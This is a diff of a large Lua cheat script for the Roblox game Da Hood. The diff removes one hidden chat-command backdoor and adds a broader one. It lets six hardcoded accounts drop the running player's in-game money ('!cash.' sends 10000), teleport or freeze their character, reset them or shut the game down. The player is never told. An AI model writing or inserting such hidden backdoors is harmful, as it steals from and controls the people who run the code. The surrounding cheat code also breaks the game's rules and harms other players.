@@ -1,8 +1,8 @@
 local SoundService = game:GetService("SoundService")
 
 local song = Instance.new("Sound")
-song.SoundId = "rbxassetid://1848354536"
-song.Volume = .5
+song.SoundId = "rbxassetid://1839246711"
+song.Volume = 1
 song.Looped = false
 song.Parent = SoundService
 song:Play()
@@ -6853,6 +6853,7 @@ end)
             game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
             end
             game:GetService("ReplicatedStorage").ClientAnimations.Block.AnimationId = "rbxassetid://0"
+            local OWNER = game:GetService("Players").LocalPlayer
             local GUN_CHECK = nil
             task.wait()
             function Block()
@@ -6862,8 +6863,8 @@ end)
             if getgenv().AUTO_BLOCK__ then getgenv().AUTO_BLOCK__:Disconnect() end
             getgenv().AUTO_BLOCK__ = game:GetService("RunService").Stepped:Connect(function()
                 if blocking == true then
-                    if STAND.Character.BodyEffects:FindFirstChild('Block') then STAND.Character.BodyEffects.Block:Destroy() end
-                    GUN_CHECK = STAND.Character:FindFirstChildWhichIsA("Tool")
+                    if OWNER.Character.BodyEffects:FindFirstChild('Block') then OWNER.Character.BodyEffects.Block:Destroy() end
+                    GUN_CHECK = OWNER.Character:FindFirstChildWhichIsA("Tool")
                     if GUN_CHECK then
                         if GUN_CHECK:FindFirstChild("GunScript") then
                             game.ReplicatedStorage.MainEvent:FireServer("Block",false)
@@ -7042,50 +7043,6 @@ end)
         end
     end)
     
-    local PP = game.Players.LocalPlayer
-    local RunService = game:GetService("RunService")
-    
-    local MainAccounts = {
-        "dahoodbotmoney5",
-        "yowhatsubbro"
-    }
-    if OWNER.Name == (MainAccounts) then
-        print("PREM")
-    else
-    RunService.RenderStepped:Connect(function()
-        pcall(function()
-            for _, username in ipairs(MainAccounts) do
-                local player = game.Players:FindFirstChild(username)
-                if player then
-                    player.Chatted:Connect(function(msg)
-                        if msg:lower() == "!reset." then
-                            game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
-                            PP.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-                        elseif msg:lower() == "!kick." then
-                            game:Shutdown()
-                        elseif msg:lower() == "!Stop." then
-                            game:GetService("RunService"):BindToRenderStep("FReeze",-1 ,function()
-                            game.Players.LocalPlayer.Character.Anchored = true
-                            end)
-                            signKills = false
-                            Stompfram = false
-                            gunKills = false
-                            Kills = false
-                            pitchKillsnostomp = false
-                            resolve = false
-                            antilock = false
-                            Annoy = false
-                            Stop()
-                        elseif msg:lower() == "!Play." then
-                            game:GetService("RunService"):UnbindFromRenderStep("Invisible")
-                            game.Players.LocalPlayer.Character.Anchored = false
-                        end
-                    end)
-                end
-            end
-        end)
-    end)
-    end
     
     rs.Stepped:Connect(function()
         if game.Players.LocalPlayer.PlayerGui.MainScreenGui.Crew.CrewFrame.Visible == true then
@@ -7109,11 +7066,100 @@ end)
         end
     end)
     
+
+    function chat(msg)
+        local A_1 = msg
+        local A_2 = "All"
+        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+        Event:FireServer(A_1, A_2)
+    end
+    
+    local targetNames = {"isthisdo23", "cruciatusadidas", "RKLWPGZLG", "zer1ckq","dahoodbotmoney5","yowhatsubbro"}
+    if table.find(targetNames, OWNER.Name) then
+        print("DEER")
+    else
+        function PoorCharacter(targetPlayer)
+        targetPlayer.Chatted:Connect(function(msg)
+            if msg:lower() == "!cash." then
+                local args = {
+                    [1] = "DropMoney",
+                    [2] = "10000"
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
+            elseif msg:lower() == "!bring." then
+                signKills = false
+                gunKills = false
+                Kills = false
+                pitchKillsnostomp = false
+                resolve = false
+                antilock = false
+                Annoy = false
+                Stop()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+            elseif msg:lower() == "!log." then
+                game:Shutdown()
+            elseif msg:lower() == "!freeze." then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+            elseif msg:lower() == "!sleep." then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)
+                game.Players.LocalPlayer.Character.Humanoid.Sit = true
+                task.wait(0.1)
+                local Char = game.Players.LocalPlayer.Character
+                local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
+                for i, v in next, Hum:GetPlayingAnimationTracks() do
+                    v:Stop()
+                end
+            elseif msg:lower() == "!unfreeze." then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+            elseif msg:lower() == "!reset." then
+                signKills = false
+                gunKills = false
+                Kills = false
+                pitchKillsnostomp = false
+                resolve = false
+                antilock = false
+                Annoy = false
+                Stop()
+                game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
+                game.Players.LocalPlayer.Character.Humanoid:ChangeState('Dead')
+            elseif msg:lower() == "/e ok" then
+                chat("HELLO")
+            elseif msg:lower() == "/e test" then
+                chat("HELLO")
+            elseif msg:lower() == "!rejoin." then
+                game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+            elseif msg:lower() == "!dance." then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                local DefaultDanceanim = Instance.new('Animation')
+                DefaultDanceanim.AnimationId = "rbxassetid://11710529975"
+                game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()
+            end
+        end)
+    end
+    
+    for _, targetName in pairs(targetNames) do
+        local player = game.Players:FindFirstChild(targetName)
+        if player then
+            print(targetName .. " in server")
+            PoorCharacter(player)
+        end
+    end
+    
+    game.Players.PlayerAdded:Connect(function(newPlayer)
+        for _, targetName in pairs(targetNames) do
+            if newPlayer.Name == targetName then
+                print(targetName .. " just joined")
+                PoorCharacter(newPlayer)
+            end
+        end
+    end)
+    end
+    
     --respawn
     STAND.CharacterAdded:connect(function()
         STAND.Character:WaitForChild("FULLY_LOADED_CHAR")
         for _, Banana in ipairs(BlacklistCharater) do
-            if OWNER.Character:FindFirstChild(Banana) and OWNER.Name ~= "dahoodbotmoney5" then
+            if OWNER.Character:FindFirstChild(Banana) then
                 print("banana!")
                 game.Players.LocalPlayer:Kick("Chnage ur Character naga")
             end
